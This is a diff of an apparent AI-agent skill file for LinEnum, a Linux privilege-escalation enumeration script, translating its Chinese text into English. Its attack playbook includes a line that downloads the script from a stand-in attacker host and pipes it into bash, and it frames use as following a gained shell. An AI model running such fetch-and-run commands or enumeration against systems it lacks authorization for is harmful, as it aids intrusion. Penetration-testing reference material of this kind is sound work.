@@ -2,38 +2,41 @@
 name: linenum-privesc-scan
 description: "LinEnum: Post-shell system enumeration. Signals: Linux privilege escalation, SUID, export results, highlighted keywords."
 zh-signals: "LinEnum: 拿 shell 后系统枚举。信号:linux提权,suid,导出结果,高亮关键字。"
+when-to-use: >-
+  Use when you have a shell on a Linux host and need to enumerate privilege
+  escalation vectors such as SUID binaries, cron jobs and writable services.
 ---
 
 # LinEnum
 
-- 攻击大类:C16 Linux本地提权
-- 上游仓库:https://github.com/rebootuser/LinEnum
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C16 Linux Local Privilege Escalation
+- Upstream Repository: https://github.com/rebootuser/LinEnum
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 curl -o LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./LinEnum.sh -t` |  thorough 全面枚举 |
-| `-r report -e /tmp/` | 导出结果 |
-| `-k keyword` | 高亮关键字 |
-| `-s` | 仅当前用户级(免 root 也能跑) |
+| `./LinEnum.sh -t` | Thorough full enumeration |
+| `-r report -e /tmp/` | Export results |
+| `-k keyword` | Highlighted keywords |
+| `-s` | Current user level only (runs without root) |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 拿 shell 后系统枚举
+### System enumeration after gaining a shell
 
 ```bash
 curl -s http://attacker/LinEnum.sh | bash -s -- -t -r enum -e /tmp/
-# 重点看: SUID/Cron/可写 service/NFS no_root_squash/docker 组
+# Focus on: SUID/Cron/writable services/NFS no_root_squash/docker group
 ```
 
-## 注意事项
+## Notes
 
-输出按颜色分级(红=高危);现代替代是 linpeas,但 LinEnum 零依赖单文件适合最小化落地。
+Output is graded by color (red = high risk); the modern replacement is linpeas, but LinEnum is a zero-dependency single file that suits minimal deployment.
